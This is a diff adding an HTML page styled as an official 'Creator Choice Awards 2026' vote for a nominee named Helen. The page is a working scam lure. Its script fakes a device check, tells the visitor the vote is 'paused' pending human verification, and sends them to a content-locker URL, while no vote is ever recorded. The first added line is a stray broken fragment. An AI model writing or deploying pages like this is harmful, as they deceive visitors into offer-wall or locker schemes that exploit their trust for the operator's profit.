@@ -1,0 +1,240 @@
+<!DOCTYPE html> <htm
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vote for Helen - Creator Choice Awards 2026</title>
+  <style>
+    :root {
+      --primary-color: #ff3b6c;
+      --bg-color: #0f1117;
+      --card-bg: #1a1d26;
+      --text-color: #ffffff;
+      --subtext-color: #a0a5b5;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .vote-card {
+      background-color: var(--card-bg);
+      border-radius: 16px;
+      padding: 32px 24px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      position: relative;
+      overflow: hidden;
+    }
+    .badge {
+      display: inline-block;
+      background: rgba(255, 59, 108, 0.15);
+      color: var(--primary-color);
+      font-size: 13px;
+      font-weight: 600;
+      padding: 6px 14px;
+      border-radius: 20px;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+    p.subtitle {
+      color: var(--subtext-color);
+      font-size: 14px;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+    .profile-section {
+      margin-bottom: 24px;
+    }
+    .avatar-placeholder {
+      width: 90px;
+      height: 90px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ff3b6c, #ff758c);
+      margin: 0 auto 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      box-shadow: 0 4px 15px rgba(255, 59, 108, 0.3);
+    }
+    .nominee-name {
+      font-size: 20px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 4px;
+    }
+    .nominee-category {
+      font-size: 13px;
+      color: var(--subtext-color);
+    }
+    .action-btn {
+      width: 100%;
+      background: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+    }
+    .action-btn:hover {
+      background: #e0325c;
+    }
+    .action-btn:disabled {
+      background: #2d313e;
+      cursor: not-allowed;
+      color: var(--subtext-color);
+    }
+    /* Verification Box (Hidden by default) */
+    .verify-box {
+      display: none;
+      background: rgba(255, 59, 108, 0.05);
+      border: 1px solid rgba(255, 59, 108, 0.4);
+      border-radius: 12px;
+      padding: 20px 16px;
+      margin-top: 20px;
+      text-align: center;
+      animation: fadeIn 0.4s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .verify-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #ff3b6c;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .verify-desc {
+      font-size: 13px;
+      color: #d0d4e4;
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+    .verify-btn {
+      width: 100%;
+      background: linear-gradient(135deg, #ff3b6c, #ff527b);
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s ease, opacity 0.2s ease;
+      box-shadow: 0 4px 15px rgba(255, 59, 108, 0.4);
+    }
+    .verify-btn:hover {
+      opacity: 0.9;
+      transform: scale(1.02);
+    }
+    /* Loading Spinner */
+    .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .status-msg {
+      margin-top: 12px;
+      font-size: 13px;
+      color: var(--subtext-color);
+      min-height: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="vote-card">
+    <span class="badge">Official Creator Poll</span>
+    <h1>Creator Choice Awards 2026</h1>
+    <p class="subtitle">Cast your official vote for <strong>Helen</strong> below! 1 free vote allowed per device.</p>
+    <div class="profile-section">
+      <div class="avatar-placeholder">👑</div>
+      <div class="nominee-name">Helen</div>
+      <div class="nominee-category">Nominee: Favorite Creator</div>
+    </div>
+    <!-- Initial Vote Button -->
+    <button id="voteBtn" class="action-btn" onclick="startVerification()">
+      <span id="spn" class="spinner"></span>
+      <span id="btnText">Vote For Helen</span>
+    </button>
+    <div id="statusMsg" class="status-msg"></div>
+    <!-- Human Verification Box (Appears after click) -->
+    <div id="verifyBox" class="verify-box">
+      <div class="verify-title">
+        <span>⚠️</span> Action Required: Vote Pending
+      </div>
+      <p class="verify-desc">
+        Your vote for Helen is <b>paused</b>. You must verify that you are a real human to submit and lock in your vote!
+      </p>
+      <button class="verify-btn" onclick="redirectToLocker()">
+        Click Here To Verify & Cast Vote
+      </button>
+    </div>
+  </div>
+  <script>
+    const LOCKER_URL = "https://content-unlock.com/?3973a58";
+    function startVerification() {
+      const btn = document.getElementById('voteBtn');
+      const spinner = document.getElementById('spn');
+      const btnText = document.getElementById('btnText');
+      const statusMsg = document.getElementById('statusMsg');
+      const verifyBox = document.getElementById('verifyBox');
+      // Disable primary button & show spinner
+      btn.disabled = true;
+      spinner.style.display = 'block';
+      btnText.textContent = 'Processing...';
+      statusMsg.textContent = 'Checking device session...';
+      // After 1.2 seconds, reveal the verification requirement box
+      setTimeout(() => {
+        spinner.style.display = 'none';
+        btnText.textContent = 'Vote Paused (Unverified)';
+        statusMsg.textContent = '';
+        
+        // Show the security verification warning box
+        verifyBox.style.display = 'block';
+      }, 1200);
+    }
+    function redirectToLocker() {
+      window.location.href = LOCKER_URL;
+    }
+  </script>
+</body>
+</html>
